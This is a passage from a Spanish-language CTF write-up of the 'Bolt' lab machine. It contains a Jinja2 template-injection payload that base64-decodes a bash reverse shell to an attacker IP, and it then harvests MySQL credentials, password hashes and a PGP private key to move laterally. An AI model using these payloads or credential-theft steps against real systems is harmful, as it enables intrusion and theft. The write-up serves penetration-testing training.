</code></pre></div><p>El contenido para poner en AdminLTE 3 (campo nombre) es:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">{{cycler.__init__.__globals__.os.popen('echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash').read()}}  
</code></pre></div><p>Y después, al confirmar los cambios en el correo, se obtiene una conexión en <code>nc</code> como usuario <code>www-data</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.114.
Ncat: Connection from 10.10.11.114:42396.
bash: cannot set terminal process group (1009): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@bolt:~/demo$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@bolt:~/demo$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@bolt:~/demo$ export TERM=xterm
www-data@bolt:~/demo$ export SHELL=bash
www-data@bolt:~/demo$ stty rows 50 columns 158
</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Existen dos usuarios: <code>clark</code> y <code>eddie</code>, y no podemos listar el contenido de sus directorios personales.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@bolt:~/demo$ ls -la /home
total 16
drwxr-xr-x  4 root  root  4096 Mar  3  2021 .
drwxr-xr-x 20 root  root  4096 Aug  4 13:07 ..
drwxr-x--- 15 clark clark 4096 Feb 25  2021 clark
drwxr-x--- 16 eddie eddie 4096 Oct 13 07:01 eddie
www-data@bolt:~/demo$ ls -la /home/clark
ls: cannot open directory '/home/clark': Permission denied  
www-data@bolt:~/demo$ ls -la /home/eddie
ls: cannot open directory '/home/eddie': Permission denied
</code></pre></div><p>Podemos conseguir unas credenciales para acceder a una base de datos de MySQL en el archivo <code>config.py</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@bolt:~/demo$ ls -la
total 36
drwxr-xr-x 5 www-data www-data 4096 Aug  4 13:06 .
drwxr-xr-x 6 root     root     4096 Aug  4 13:06 ..
-rw-r--r-- 1 www-data www-data 6399 Mar  6  2021 app.py
-rw-r--r-- 1 www-data www-data  420 Mar  4  2021 config.py
drwxr-xr-x 2 www-data www-data 4096 Mar  6  2021 __pycache__  
drwxr-xr-x 3 www-data www-data 4096 Mar  4  2021 static
drwxrwxr-x 6 www-data www-data 4096 Mar  5  2021 templates
-rw-r--r-- 1 www-data www-data   62 Mar  4  2021 wsgi.py
www-data@bolt:~/demo$ cat config.py
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk4">"""Flask</span> <span class="mtk4">Configuration"""</span>
<span class="mtk3">#SQLALCHEMY_DATABASE_URI</span> <span class="mtk3">=</span> <span class="mtk3">'sqlite:///database.db'</span>
<span class="mtk1">SQLALCHEMY_DATABASE_URI</span> <span class="mtk5">=</span> <span class="mtk4">'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltm</span><span class="mtk4">ail'</span>  
<span class="mtk1">SQLALCHEMY_TRACK_MODIFICATIONS</span> <span class="mtk5">=</span> <span class="mtk6">True</span>
<span class="mtk1">SECRET_KEY</span> <span class="mtk5">=</span> <span class="mtk4">'kreepandcybergeek'</span>
<span class="mtk1">MAIL_SERVER</span> <span class="mtk5">=</span> <span class="mtk4">'localhost'</span>
<span class="mtk1">MAIL_PORT</span> <span class="mtk5">=</span> <span class="mtk6">25</span>
<span class="mtk1">MAIL_USE_TLS</span> <span class="mtk5">=</span> <span class="mtk6">False</span>
<span class="mtk1">MAIL_USE_SSL</span> <span class="mtk5">=</span> <span class="mtk6">False</span>
<span class="mtk3">#MAIL_DEBUG</span> <span class="mtk3">=</span> <span class="mtk3">app.debug</span>
<span class="mtk1">MAIL_USERNAME</span> <span class="mtk5">=</span> <span class="mtk6">None</span>
<span class="mtk1">MAIL_PASSWORD</span> <span class="mtk5">=</span> <span class="mtk6">None</span>
<span class="mtk1">DEFAULT_MAIL_SENDER</span> <span class="mtk5">=</span> <span class="mtk4">'support@bolt.htb'</span>
</code></pre></div><p>Ahora podemos acceder a la base de datos <code>boltmail</code> con credenciales <code>bolt_dba:dXUUHSW9vBpH5qRB</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@bolt:~/demo$ mysql --user=bolt_dba --password=dXUUHSW9vBpH5qRB --database=boltmail  

mysql&gt; show tables;
+--------------------+
| Tables_in_boltmail |
+--------------------+
| user               |
+--------------------+
1 row in set (0.00 sec)

mysql&gt; describe user;
+-----------------+---------------+------+-----+---------+----------------+
| Field           | Type          | Null | Key | Default | Extra          |
+-----------------+---------------+------+-----+---------+----------------+
| id              | int           | NO   | PRI | NULL    | auto_increment |
| username        | varchar(255)  | YES  |     | NULL    |                |
| password        | varchar(255)  | YES  |     | NULL    |                |
| email           | varchar(255)  | YES  |     | NULL    |                |
| host_header     | varchar(255)  | YES  |     | NULL    |                |
| ip_address      | varchar(255)  | YES  |     | NULL    |                |
| email_confirmed | tinyint(1)    | YES  |     | NULL    |                |
| profile_confirm | tinyint(1)    | YES  |     | NULL    |                |
| profile_update  | varchar(4096) | YES  |     | NULL    |                |
+-----------------+---------------+------+-----+---------+----------------+
9 rows in set (0.00 sec)

mysql&gt; select username, password from user;
+-------------+------------------------------------+
| username    | password                           |
+-------------+------------------------------------+
| admin       | $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q. |
| asdf        | $1$KsE5LxFN$Xo2Xo.DRX82fo8D2.fSo/1 |
+-------------+------------------------------------+
2 rows in set (0.00 sec)

mysql&gt; exit
</code></pre></div><p>A pesar de haber obtenido el <em>hash</em> de la contraseña de <code>admin</code>, es la misma que se encontró antes.</p><p>Pensando en el subdominio <code>passbolt.bolt.htb</code>, podemos explorar por los archivos de configuración de dicho servicio. Podemos encontrar un archivo PHP con credenciales de acceso a la base de datos <code>passboltdb</code> de MySQL (<code>passbolt:rT2;jW7&lt;eY8!dX8}pQ8%</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@bolt:~/demo$ cat /etc/passbolt/passbolt.php  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
<span class="mtk3">/**</span>
 <span class="mtk3">*</span> <span class="mtk3">...</span>
 <span class="mtk3">*/</span>
<span class="mtk5">return</span> <span class="mtk1">[</span>
    <span class="mtk4">'App'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
        <span class="mtk3">//</span> <span class="mtk3">A</span> <span class="mtk3">base</span> <span class="mtk3">URL</span> <span class="mtk3">to</span> <span class="mtk3">use</span> <span class="mtk3">for</span> <span class="mtk3">absolute</span> <span class="mtk3">links.</span>
        <span class="mtk3">//</span> <span class="mtk3">The</span> <span class="mtk3">url</span> <span class="mtk3">where</span> <span class="mtk3">the</span> <span class="mtk3">passbolt</span> <span class="mtk3">instance</span> <span class="mtk3">will</span> <span class="mtk3">be</span> <span class="mtk3">reachable</span> <span class="mtk3">to</span> <span class="mtk3">your</span> <span class="mtk3">end</span> <span class="mtk3">users.</span>  
        <span class="mtk3">//</span> <span class="mtk3">This</span> <span class="mtk3">information</span> <span class="mtk3">is</span> <span class="mtk3">need</span> <span class="mtk3">to</span> <span class="mtk3">render</span> <span class="mtk3">images</span> <span class="mtk3">in</span> <span class="mtk3">emails</span> <span class="mtk3">for</span> <span class="mtk3">example</span>
        <span class="mtk4">'fullBaseUrl'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'</span><span class="mtk4 detected-link">https://passbolt.bolt.htb</span><span class="mtk4">'</span><span class="mtk1">,</span>
    <span class="mtk1">],</span>

    <span class="mtk3">//</span> <span class="mtk3">Database</span> <span class="mtk3">configuration.</span>
    <span class="mtk4">'Datasources'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
        <span class="mtk4">'default'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk4">'host'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'localhost'</span><span class="mtk1">,</span>
            <span class="mtk4">'port'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'3306'</span><span class="mtk1">,</span>
            <span class="mtk4">'username'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'passbolt'</span><span class="mtk1">,</span>
            <span class="mtk4">'password'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'rT2;jW7&lt;eY8!dX8}pQ8%'</span><span class="mtk1">,</span>
            <span class="mtk4">'database'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'passboltdb'</span><span class="mtk1">,</span>
        <span class="mtk1">],</span>
    <span class="mtk1">],</span>

    <span class="mtk3">//</span> <span class="mtk3">Email</span> <span class="mtk3">configuration.</span>
    <span class="mtk4">'EmailTransport'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
        <span class="mtk4">'default'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk4">'host'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'localhost'</span><span class="mtk1">,</span>
            <span class="mtk4">'port'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">587</span><span class="mtk1">,</span>
            <span class="mtk4">'username'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">null</span><span class="mtk1">,</span>
            <span class="mtk4">'password'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">null</span><span class="mtk1">,</span>
            <span class="mtk3">//</span> <span class="mtk3">Is</span> <span class="mtk3">this</span> <span class="mtk3">a</span> <span class="mtk3">secure</span> <span class="mtk3">connection?</span> <span class="mtk3">true</span> <span class="mtk3">if</span> <span class="mtk3">yes,</span> <span class="mtk3">null</span> <span class="mtk3">if</span> <span class="mtk3">no.</span>
            <span class="mtk4">'tls'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">true</span><span class="mtk1">,</span>
            <span class="mtk3">//'timeout'</span> <span class="mtk3">=&gt;</span> <span class="mtk3">30,</span>
            <span class="mtk3">//'client'</span> <span class="mtk3">=&gt;</span> <span class="mtk3">null,</span>
            <span class="mtk3">//'url'</span> <span class="mtk3">=&gt;</span> <span class="mtk3">null,</span>
        <span class="mtk1">],</span>
    <span class="mtk1">],</span>
    <span class="mtk4">'Email'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
        <span class="mtk4">'default'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk3">//</span> <span class="mtk3">Defines</span> <span class="mtk3">the</span> <span class="mtk3">default</span> <span class="mtk3">name</span> <span class="mtk3">and</span> <span class="mtk3">email</span> <span class="mtk3">of</span> <span class="mtk3">the</span> <span class="mtk3">sender</span> <span class="mtk3">of</span> <span class="mtk3">the</span> <span class="mtk3">emails.</span>
            <span class="mtk4">'from'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span><span class="mtk4">'localhost@bolt.htb'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'localhost'</span><span class="mtk1">],</span>
            <span class="mtk3">//'charset'</span> <span class="mtk3">=&gt;</span> <span class="mtk3">'utf-8',</span>
            <span class="mtk3">//'headerCharset'</span> <span class="mtk3">=&gt;</span> <span class="mtk3">'utf-8',</span>
        <span class="mtk1">],</span>
    <span class="mtk1">],</span>
    <span class="mtk4">'passbolt'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
        <span class="mtk3">//</span> <span class="mtk3">GPG</span> <span class="mtk3">Configuration.</span>
        <span class="mtk3">//</span> <span class="mtk3">The</span> <span class="mtk3">keyring</span> <span class="mtk3">must</span> <span class="mtk3">to</span> <span class="mtk3">be</span> <span class="mtk3">owned</span> <span class="mtk3">and</span> <span class="mtk3">accessible</span> <span class="mtk3">by</span> <span class="mtk3">the</span> <span class="mtk3">webserver</span> <span class="mtk3">user.</span>
        <span class="mtk3">//</span> <span class="mtk3">Example:</span> <span class="mtk3">www-data</span> <span class="mtk3">user</span> <span class="mtk3">on</span> <span class="mtk3">Debian</span>
        <span class="mtk4">'gpg'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk3">//</span> <span class="mtk3">Main</span> <span class="mtk3">server</span> <span class="mtk3">key.</span>
            <span class="mtk4">'serverKey'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
                <span class="mtk3">//</span> <span class="mtk3">Server</span> <span class="mtk3">private</span> <span class="mtk3">key</span> <span class="mtk3">fingerprint.</span>
                <span class="mtk4">'fingerprint'</span> <span class="mtk5">=&gt;</span> <span class="mtk4">'59860A269E803FA094416753AB8E2EFB56A16C84'</span><span class="mtk1">,</span>
                <span class="mtk4">'public'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">CONFIG</span> <span class="mtk5">.</span> <span class="mtk6">DS</span> <span class="mtk5">.</span> <span class="mtk4">'gpg'</span> <span class="mtk5">.</span> <span class="mtk6">DS</span> <span class="mtk5">.</span> <span class="mtk4">'serverkey.asc'</span><span class="mtk1">,</span>
                <span class="mtk4">'private'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">CONFIG</span> <span class="mtk5">.</span> <span class="mtk6">DS</span> <span class="mtk5">.</span> <span class="mtk4">'gpg'</span> <span class="mtk5">.</span> <span class="mtk6">DS</span> <span class="mtk5">.</span> <span class="mtk4">'serverkey_private.asc'</span><span class="mtk1">,</span>
            <span class="mtk1">],</span>
        <span class="mtk1">],</span>
        <span class="mtk4">'registration'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk4">'public'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">false</span><span class="mtk1">,</span>
        <span class="mtk1">],</span>
        <span class="mtk4">'ssl'</span> <span class="mtk5">=&gt;</span> <span class="mtk1">[</span>
            <span class="mtk4">'force'</span> <span class="mtk5">=&gt;</span> <span class="mtk6">true</span><span class="mtk1">,</span>
        <span class="mtk1">]</span>
    <span class="mtk1">],</span>
<span class="mtk1">];</span>
</code></pre></div><p>Ahora, nos podemos conectar a la base de datos con las credenciales encontradas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@bolt:~/demo$ mysql --user=passbolt --password='rT2;jW7&lt;eY8!dX8}pQ8%' --database=passboltdb  

mysql&gt; show tables;
+-----------------------+
| Tables_in_passboltdb  |
+-----------------------+
| account_settings      |
| action_logs           |
| actions               |
| authentication_tokens |
| avatars               |
| comments              |
| email_queue           |
| entities_history      |
| favorites             |
| gpgkeys               |
| groups                |
| groups_users          |
| organization_settings |
| permissions           |
| permissions_history   |
| phinxlog              |
| profiles              |
| resource_types        |
| resources             |
| roles                 |
| secret_accesses       |
| secrets               |
| secrets_history       |
| user_agents           |
| users                 |
+-----------------------+
25 rows in set (0.01 sec)

mysql&gt; describe secrets;
+-------------+------------+------+-----+---------+-------+
| Field       | Type       | Null | Key | Default | Extra |
+-------------+------------+------+-----+---------+-------+
| id          | char(36)   | NO   | PRI | NULL    |       |
| user_id     | char(36)   | NO   | MUL | NULL    |       |
| resource_id | char(36)   | NO   | MUL | NULL    |       |
| data        | mediumtext | NO   |     | NULL    |       |
| created     | datetime   | NO   |     | NULL    |       |
| modified    | datetime   | NO   |     | NULL    |       |
+-------------+------------+------+-----+---------+-------+
6 rows in set (0.00 sec)

mysql&gt; select * from secrets\G
*************************** 1. row ***************************
         id: 643a8b12-c42c-4507-8646-2f8712af88f8
    user_id: 4e184ee6-e436-47fb-91c9-dccb57f250bc
resource_id: cd0270db-c83f-4f44-b7ac-76609b397746
       data: -----BEGIN PGP MESSAGE-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

wcBMA/ZcqHmj13/kAQgAkS/2GvYLxglAIQpzFCydAPOj6QwdVV5BR17W5psc
g/ajGlQbkE6wgmpoV7HuyABUjgrNYwZGN7ak2Pkb+/3LZgtpV/PJCAD030kY
pCLSEEzPBiIGQ9VauHpATf8YZnwK1JwO/BQnpJUJV71YOon6PNV71T2zFr3H
oAFbR/wPyF6Lpkwy56u3A2A6lbDb3sRl/SVIj6xtXn+fICeHjvYEm2IrE4Px
l+DjN5Nf4aqxEheWzmJwcyYqTsZLMtw+rnBlLYOaGRaa8nWmcUlMrLYD218R
zyL8zZw0AEo6aOToteDPchiIMqjuExsqjG71CO1ohIIlnlK602+x7/8b7nQp
edLA7wF8tR9g8Tpy+ToQOozGKBy/auqOHO66vA1EKJkYSZzMXxnp45XA38+u
l0/OwtBNuNHreOIH090dHXx69IsyrYXt9dAbFhvbWr6eP/MIgh5I0RkYwGCt
oPeQehKMPkCzyQl6Ren4iKS+F+L207kwqZ+jP8uEn3nauCmm64pcvy/RZJp7
FUlT7Sc0hmZRIRQJ2U9vK2V63Yre0hfAj0f8F50cRR+v+BMLFNJVQ6Ck3Nov
8fG5otsEteRjkc58itOGQ38EsnH3sJ3WuDw8ifeR/+K72r39WiBEiE2WHVey
5nOF6WEnUOz0j0CKoFzQgri9YyK6CZ3519x3amBTgITmKPfgRsMy2OWU/7tY
NdLxO3vh2Eht7tqqpzJwW0CkniTLcfrzP++0cHgAKF2tkTQtLO6QOdpzIH5a
Iebmi/MVUAw3a9J+qeVvjdtvb2fKCSgEYY4ny992ov5nTKSH9Hi1ny2vrBhs
nO9/aqEQ+2tE60QFsa2dbAAn7QKk8VE2B05jBGSLa0H7xQxshwSQYnHaJCE6
TQtOIti4o2sKEAFQnf7RDgpWeugbn/vphihSA984
=P38i
-----END PGP MESSAGE-----

    created: 2021-02-25 21:50:11
   modified: 2021-03-06 15:34:36
1 row in set (0.00 sec)

mysql&gt; exit
</code></pre></div><p>En esta base de datos podemos encontrar los dos usuarios definidos en el sistema, y también un mensaje encriptado con PGP. La base de datos también contiene claves públicas, pero no son tan importantes.</p><h2 id="movimiento-lateral-al-usuario-eddie">Movimiento lateral al usuario <code>eddie</code></h2><p>Y otro nuevo punto muerto. Podemos tratar de cambiar al usuario <code>eddie</code> con alguna de las contraseñas encontradas. Curiosamente, la contraseña <code>rT2;jW7&lt;eY8!dX8}pQ8%</code> (reutilizada en MySQL) funciona:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> eddie@10.10.11.114
eddie@10.10.11.114's password:
<span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ cat user.txt
1d32df183e61b198aa42469ede79fd61  
</code></pre></div><p>Habiendo capturado la <em>flag</em> <code>user.txt</code>, podemos continuar listando los archivos que son propiedad de <code>eddie</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ find / -user eddie 2&gt;/dev/null | grep -vE 'home|proc|sys|run|dev|tmp'
/var/mail/eddie
<span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ cat /var/mail/eddie
From clark@bolt.htb  Thu Feb 25 14:20:19 2021
Return-Path: &lt;clark@bolt.htb&gt;
X-Original-To: eddie@bolt.htb
Delivered-To: eddie@bolt.htb
Received: by bolt.htb (Postfix, from userid 1001)
        id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST)
Subject: Important!
To: &lt;eddie@bolt.htb&gt;
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: &lt;20210225212019.DFF264CD@bolt.htb&gt;
Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST)
From: Clark Griswold &lt;clark@bolt.htb&gt;

Hey Eddie,

The password management server is up and running.  Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it.  Your private key is the only way to recover your account.  
Once you're set up you can start importing your passwords.  Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...

-Clark
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Hemos encontrado un mensaje de correo interesante enviado por <code>clark</code> para <code>eddie</code>. Le dice que use una extensión del navegador y que guarde su clave privada.</p><p>Existen varios archivos relacionados con Google Chrome en el directorio personal de <code>eddie</code>. Puede ser que la configuración de la extensión esté aquí.</p><h3 id="buscando-una-clave-privada-pgp">Buscando una clave privada PGP</h3><p>Podemos buscar por contenidos de PGP en el directorio personal:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ grep -r 'BEGIN PGP' ~
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:    if (!message.match(/-----BEGIN PGP MESSAGE-----/)) {
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PUBLIC_HEADER = '-----BEGIN PGP PUBLIC KEY BLOCK-----';
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/index.min.js:const PRIVATE_HEADER = '-----BEGIN PGP PRIVATE KEY BLOCK-----';
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  const reHeader = /^-----BEGIN PGP (MESSAGE, PART \d+\/\d+|MESSAGE, PART \d+|SIGNED MESSAGE|MESSAGE|PUBLIC KEY BLOCK|PRIVATE KEY BLOCK|SIGNATURE)-----$/m;  
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:  // BEGIN PGP MESSAGE, PART X/Y
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:    // BEGIN PGP MESSAGE, PART X
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      // BEGIN PGP SIGNED MESSAGE
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:        // BEGIN PGP MESSAGE
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:          // BEGIN PGP PUBLIC KEY BLOCK
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:            // BEGIN PGP PRIVATE KEY BLOCK
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // BEGIN PGP SIGNATURE
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:              // cleartext signatures. Note that PGP 2.x uses BEGIN PGP MESSAGE
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE, PART " + partindex + "/" + parttotal + "-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE, PART " + partindex + "-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("\r\n-----BEGIN PGP SIGNED MESSAGE-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("\r\n-----BEGIN PGP SIGNATURE-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP MESSAGE-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PUBLIC KEY BLOCK-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP PRIVATE KEY BLOCK-----\r\n");
/home/eddie/.config/google-chrome/Default/Extensions/didegimhafipceonhjepacocaffmoppf/3.0.5_0/vendors/openpgp.js:      result.push("-----BEGIN PGP SIGNATURE-----\r\n");
Binary file /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
</code></pre></div><p>Después de mirar en varios archivos, se ve que el archivo binario contiene una clave privada PGP. Esta se puede mostrar usando <code>strings</code> y filtrando por el formato de una clave privada:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">eddie@bolt</span>:<span class="code-blue">~</span>$ strings '/home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log' | grep -oP '\-\-\-\-\-BEGIN PGP PRIVATE [\s\S]*?END PGP PRIVATE KEY BLOCK\-\-\-\-\-' | head -1  
-----BEGIN PGP PRIVATE KEY BLOCK-----
Version: OpenPGP.js v4.10.9
Comment: https://openpgpjs.org

xcMGBGA4G2EBCADbpIGoMv+O5sxsbYX3ZhkuikEiIbDL8JRvLX/r1KlhWlTi
fjfUozTU9a0OLuiHUNeEjYIVdcaAR89lVBnYuoneAghZ7eaZuiLz+5gaYczk
cpRETcVDVVMZrLlW4zhA9OXfQY/d4/OXaAjsU9w+8ne0A5I0aygN2OPnEKhU
RNa6PCvADh22J5vD+/RjPrmpnHcUuj+/qtJrS6PyEhY6jgxmeijYZqGkGeWU
+XkmuFNmq6km9pCw+MJGdq0b9yEKOig6/UhGWZCQ7RKU1jzCbFOvcD98YT9a
If70XnI0xNMS4iRVzd2D4zliQx9d6BqEqZDfZhYpWo3NbDqsyGGtbyJlABEB
AAH+CQMINK+e85VtWtjguB8IR+AfuDbIzHyKKvMfGStRhZX5cdsUfv5znicW
UjeGmI+w7iQ+WYFlmjFN/Qd527qOFOZkm6TgDMUVubQFWpeDvhM4F3Y+Fhua
jS8nQauoC87vYCRGXLoCrzvM03IpepDgeKqVV5r71gthcc2C/Rsyqd0BYXXA
iOe++biDBB6v/pMzg0NHUmhmiPnSNfHSbABqaY3WzBMtisuUxOzuvwEIRdac
2eEUhzU4cS8s1QyLnKO8ubvD2D4yVk+ZAxd2rJhhleZDiASDrIDT9/G5FDVj
QY3ep7tx0RTE8k5BE03NrEZi6TTZVa7MrpIDjb7TLzAKxavtZZYOJkhsXaWf
DRe3Gtmo/npea7d7jDG2i1bn9AJfAdU0vkWrNqfAgY/r4j+ld8o0YCP+76K/
7wiZ3YYOBaVNiz6L1DD0B5GlKiAGf94YYdl3rfIiclZYpGYZJ9Zbh3y4rJd2
AZkM+9snQT9azCX/H2kVVryOUmTP+uu+p+e51z3mxxngp7AE0zHqrahugS49
tgkE6vc6G3nG5o50vra3H21kSvv1kUJkGJdtaMTlgMvGC2/dET8jmuKs0eHc
Uct0uWs8LwgrwCFIhuHDzrs2ETEdkRLWEZTfIvs861eD7n1KYbVEiGs4n2OP
yF1ROfZJlwFOw4rFnmW4Qtkq+1AYTMw1SaV9zbP8hyDMOUkSrtkxAHtT2hxj
XTAuhA2i5jQoA4MYkasczBZp88wyQLjTHt7ZZpbXrRUlxNJ3pNMSOr7K/b3e
IHcUU5wuVGzUXERSBROU5dAOcR+lNT+Be+T6aCeqDxQo37k6kY6Tl1+0uvMp
eqO3/sM0cM8nQSN6YpuGmnYmhGAgV/Pj5t+cl2McqnWJ3EsmZTFi37Lyz1CM
vjdUlrpzWDDCwA8VHN1QxSKv4z2+QmXSzR5FZGRpZSBKb2huc29uIDxlZGRp
ZUBib2x0Lmh0Yj7CwI0EEAEIACAFAmA4G2EGCwkHCAMCBBUICgIEFgIBAAIZ
AQIbAwIeAQAhCRAcJ0Gj3DtKvRYhBN9Ca8ekqK9Y5Q7aDhwnQaPcO0q9+Q0H
/R2ThWBN8roNk7hCWO6vUH8Da1oXyR5jsHTNZAileV5wYnN+egxf1Yk9/qXF
nyG1k/IImCGf9qmHwHe+EvoDCgYpvMAQB9Ce1nJ1CPqcv818WqRsQRdLnyba
qx5j2irDWkFQhFd3Q806pVUYtL3zgwpupLdxPH/Bj2CvTIdtYD454aDxNbNt
